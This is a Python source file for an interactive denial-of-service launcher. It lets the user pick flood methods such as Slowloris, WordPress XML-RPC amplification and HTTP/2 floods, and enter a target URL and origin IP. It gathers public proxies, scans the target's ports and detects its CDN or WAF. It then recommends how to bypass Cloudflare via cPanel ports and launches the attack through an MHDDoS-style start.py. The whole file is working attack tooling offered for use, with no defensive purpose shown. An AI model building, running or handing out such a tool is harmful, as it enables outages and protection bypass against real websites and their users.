#!/usr/bin/env python3
import os
import sys
import subprocess

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    OKRED = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner():
    print(f"""{bcolors.OKRED}
    ╦  ╦╔═╗╔╗╔  ╦ ╦╔═╗╦  ╔═╗╦╔╗╔╔═╗
    ╚╗╔╝╠═╣║║║  ╠═╣║╣ ║  ╚═╗║║║║║ ╦
     ╚╝ ╩ ╩╝╚╝  ╩ ╩╚═╝╩═╝╚═╝╩╝╚╝╚═╝ DoS
    {bcolors.WARNING}Interactive Commander v1.0{bcolors.RESET}
    """)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def main():
    clear()
    banner()

    print(f"{bcolors.HEADER}[ SELECT METHOD ]{bcolors.RESET}")
    print(f"[{bcolors.OKCYAN}1{bcolors.RESET}] SLOW    - (Best for Windows/Apache/XAMPP)")
    print(f"[{bcolors.OKCYAN}2{bcolors.RESET}] DYN     - (Best for Nginx/Cloudflare/Evasion)")
    print(f"[{bcolors.OKCYAN}3{bcolors.RESET}] STRESS  - (High Load/Universal Stress Test)")
    print(f"[{bcolors.OKCYAN}4{bcolors.RESET}] XMLRPC  - (WordPress Amplification Method)")
    print(f"[{bcolors.OKCYAN}5{bcolors.RESET}] POST_DYN- (Phase 2: Non-Cacheable POST Flood)")

    
    # [PHASE 17] Attack Intel Module
    print(f"[{bcolors.OKCYAN}7{bcolors.RESET}] ATTACK INTEL (Origin Scan + Auto-Rec)")
    print("")
    
    choice = input(f"{bcolors.BOLD}Choose Method (1-7): {bcolors.RESET}")
    
    if choice == "7":
        run_intel()
        sys.exit(0)

    methods = {"1": "SLOW", "2": "DYN", "3": "STRESS", "4": "XMLRPC", "5": "POST_DYN", "6": "H2_FLOOD"}
    method = methods.get(choice, "SLOW")

    clear()
    banner()
    print(f"{bcolors.HEADER}[ TARGET CONFIGURATION ]{bcolors.RESET}")
    url = input(f"Target URL (e.g. https://example.com): {bcolors.OKBLUE}").strip()
    print(f"{bcolors.RESET}", end="")
    
    origin_ip = input(f"Origin IP (Optional, press Enter to skip): {bcolors.OKBLUE}").strip()
    print(f"{bcolors.RESET}", end="")
    
    if origin_ip:
        target = f"{url}@{origin_ip}"
    else:
        target = url

    clear()
    banner()
    print(f"{bcolors.HEADER}[ PROXY CONFIGURATION ]{bcolors.RESET}")
    print(f"[{bcolors.OKCYAN}1{bcolors.RESET}] Public Proxy (Auto-Scavenge/Download)")
    print(f"[{bcolors.OKCYAN}2{bcolors.RESET}] Private Proxy (From your own file)")
    print(f"[{bcolors.OKCYAN}3{bcolors.RESET}] Indonesian Scavenger (Auto-find Indo Proxies)")
    
    proxy_choice = input(f"{bcolors.BOLD}Choose Proxy Type (1-3): {bcolors.RESET}")
    
    if proxy_choice == "2":
        proxy_file = input(f"Enter proxy filename (e.g. proxy.txt): {bcolors.OKBLUE}").strip()
        proxy_type = "5"
        print(f"{bcolors.RESET}", end="")
    elif proxy_choice == "3":
        proxy_file = "proxy.txt"
        proxy_type = "7" # Indo Scavenger mode
    else:
        proxy_file = "proxy.txt"
        proxy_type = "5"

    clear()
    banner()
    print(f"{bcolors.HEADER}[ INTENSITY CONFIGURATION ]{bcolors.RESET}")
    print(f"{bcolors.WARNING}Note: Running multiple terminals is better than high thread counts.{bcolors.RESET}")
    
    threads = input(f"Threads (Recommended: 100-500, current best: 100): {bcolors.OKBLUE}").strip() or "100"
    print(f"{bcolors.RESET}", end="")
    
    rpc = input(f"RPC (Requests Per Connection, Default: 5): {bcolors.OKBLUE}").strip() or "5"
    print(f"{bcolors.RESET}", end="")
    
    duration = input(f"Duration in Seconds (e.g. 800): {bcolors.OKBLUE}").strip() or "800"
    print(f"{bcolors.RESET}", end="")

    # Preparation for execution
    # MHDDoS/VanHelsing structure: python3 start.py <METHOD> <URL> <PROXY_TYPE> <THREADS> <PROXY_FILE> <RPC> <DURATION>

    cmd = [
        "python3", "start.py",
        method,
        target,
        proxy_type,
        threads,
        proxy_file,
        rpc,
        duration
    ]

    clear()
    banner()
    print(f"{bcolors.OKGREEN}CONFIGURATION COMPLETE!{bcolors.RESET}")
    print(f"Method   : {bcolors.OKBLUE}{method}{bcolors.RESET}")
    print(f"Target   : {bcolors.OKBLUE}{target}{bcolors.RESET}")
    print(f"Threads  : {bcolors.OKBLUE}{threads}{bcolors.RESET}")
    print(f"Duration : {bcolors.OKBLUE}{duration}s{bcolors.RESET}")
    print("-" * 30)
    print(f"{bcolors.BOLD}Launching Attack...{bcolors.RESET}")
    
    try:
        subprocess.run(cmd)
    except Exception as e:
        print(f"\n{bcolors.FAIL}Error: {e}{bcolors.RESET}")

def run_intel():
    clear()
    banner()
    print(f"{bcolors.HEADER}[ ATTACK INTEL & ORIGIN SCANNER PRO ]{bcolors.RESET}")
    target = input(f"Enter Target Domain (e.g. example.com): {bcolors.OKBLUE}").strip()
    print(f"{bcolors.RESET}", end="")
    
    if "://" in target:
        target_domain = target.split("://")[1].split("/")[0]
        target_url = target
    else:
        target_domain = target.split("/")[0]
        target_url = f"https://{target}"

    print("-" * 40)
    print(f"{bcolors.OKCYAN}Phase 1: DNS & Origin Resolution...{bcolors.RESET}")
    
    resolved_ip = None
    try:
        import socket
        resolved_ip = socket.gethostbyname(target_domain)
        print(f"[*] DNS Resolved IP: {bcolors.BOLD}{resolved_ip}{bcolors.RESET}")
    except Exception as e:
        print(f"{bcolors.FAIL}[!] DNS Resolution Failed: {e}{bcolors.RESET}")

    print(f"\n{bcolors.OKCYAN}Phase 2: Port & Backend Scanner...{bcolors.RESET}")
    open_ports = []
    interesting_ports = [80, 443, 8080, 8443, 2052, 2053, 2082, 2083, 2086, 2087, 8880]
    try:
        import socket
        for port in interesting_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target_domain, port))
            if result == 0:
                print(f"[*] Port {port:<5} : {bcolors.OKGREEN}OPEN{bcolors.RESET}")
                open_ports.append(port)
            sock.close()
    except:
        pass

    print(f"\n{bcolors.OKCYAN}Phase 3: CMS & Vulnerability Hunter...{bcolors.RESET}")
    cms_detected = "Unknown"
    vuln_vector = None
    
    try:
        import requests
        import urllib3
        urllib3.disable_warnings() 
        
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
        
        # 1. Base Check
        r = requests.head(target_url, headers=headers, timeout=5, verify=False)
        server_header = r.headers.get('Server', 'Unknown')
        powered_by = r.headers.get('X-Powered-By', 'Unknown')
        
        # 2. WordPress XMLRPC Check
        print("[*] Checking for WordPress XML-RPC...", end="\r")
        try:
            xml_url = f"{target_url}/xmlrpc.php"
            r_xml = requests.get(xml_url, headers=headers, timeout=5, verify=False)
            if r_xml.status_code == 405 or "XML-RPC server accepts POST requests only" in r_xml.text:
                print(f"[*] XML-RPC      : {bcolors.FAIL}VULNERABLE (Use Menu 4!){bcolors.RESET}   ")
                cms_detected = "WordPress"
                vuln_vector = "XMLRPC"
            else:
                 print(f"[*] XML-RPC      : Safe/Not Found           ")
        except:
             print(f"[*] XML-RPC      : Error Checking           ")

        # 3. WAF Detection
        cdn_guess = "Unknown"
        wafs = {
            "cloudflare": "Cloudflare",
            "akamai": "Akamai",
            "fastly": "Fastly",
            "imperva": "Imperva",
            "incapsula": "Imperva",
            "sucuri": "Sucuri"
        }
        headers_str = str(r.headers).lower()
        for key, name in wafs.items():
            if key in headers_str:
                cdn_guess = name
                break
        
        print(f"[*] Server       : {bcolors.OKGREEN}{server_header}{bcolors.RESET}")
        if cdn_guess != "Unknown":
            print(f"[*] CDN/WAF      : {bcolors.FAIL}{cdn_guess}{bcolors.RESET}")

        # Phase 4: Tacitcal Recommendation
        print(f"\n{bcolors.BOLD}>>> TACTICAL RECOMMENDATION <<<{bcolors.RESET}")
        
        rec_method = "H2_FLOOD"
        reason = "Standard High-Throughput HTTP/2 Attack"
        cmd_example = f"python3 start.py H2_FLOOD {target_url} 7 100 proxy.txt 50 800"

        if vuln_vector == "XMLRPC":
            rec_method = "XMLRPC"
            reason = "CRITICAL: XML-RPC Amplification detected! Most damage per request."
            # XMLRPC defaults: threads=100, rpc=50
            args = [rec_method, target_url, "7", "100", "proxy.txt", "50", "800"]
        elif "Apache" in server_header and cdn_guess == "Unknown":
            rec_method = "SLOW"
            reason = "Apache Target without WAF is vulnerable to Slowloris."
            # SLOW defaults: threads=100, rpc=1000 (Keep-Alive)
            args = [rec_method, target_url, "5", "100", "proxy.txt", "1000", "800"]
        elif 2083 in open_ports or 2087 in open_ports:
            rec_method = "H2_FLOOD"
            # Adjust target to port 2083
            target_url = f"{target_url.replace('https://', '').replace('http://', '').split('/')[0]}:2083"
            reason = "cPanel Ports Open! Attack PORT 2083 to bypass Cloudflare WAF."
            # H2_FLOOD defaults
            args = [rec_method, target_url, "7", "100", "proxy.txt", "50", "800"]
        else:
             # Default H2_FLOOD
             args = [rec_method, target_url, "7", "100", "proxy.txt", "50", "800"]

        cmd_string = f"python3 start.py {' '.join(args)}"

        print(f"Method : {bcolors.FAIL}{rec_method}{bcolors.RESET}")
        print(f"Reason : {reason}")
        print(f"Command: {bcolors.OKBLUE}{cmd_string}{bcolors.RESET}")
        
        print(f"\n{bcolors.WARNING}[?] Execute this attack now? (y/n): {bcolors.RESET}", end="")
        q = input().lower()
        if q.startswith("y"):
             cmd = ["python3", "start.py"] + args
             try:
                subprocess.run(cmd)
             except KeyboardInterrupt:
                pass
             except Exception as e:
                print(f"Error: {e}")

    except ImportError:
         print(f"{bcolors.FAIL}[!] Missing requests library. run 'pip install requests'{bcolors.RESET}")
    except Exception as e:
         print(f"{bcolors.FAIL}[!] Analysis Error: {e}{bcolors.RESET}")

    print("\nPress Enter to return to menu...")
    input()
    main()

if __name__ == "__main__":
    main()
